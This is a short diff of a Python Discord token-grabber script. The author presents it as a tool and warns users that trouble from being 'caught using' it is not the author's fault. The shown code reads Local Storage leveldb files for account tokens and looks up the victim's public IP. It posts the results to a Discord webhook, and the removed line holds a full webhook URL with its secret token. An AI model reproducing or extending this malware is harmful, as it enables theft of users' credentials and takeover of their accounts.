@@ -1,6 +1,6 @@
 import requests, os, re
 from dhooks import Webhook, Embed
-#xi program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#xxi program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 def xxisniff(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
@@ -18,7 +18,7 @@ def xxisniff(path):
         pass
 
 def xxi():
-    hook = Webhook("https://discord.com/api/webhooks/821496625020010496/G4qzMdilruj46kqAdRaJcfFfkK1R7kPsUvY1UDWDOW52R4groIgPc_p9ZcDz3CNZOy9R")
+    hook = Webhook("")
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
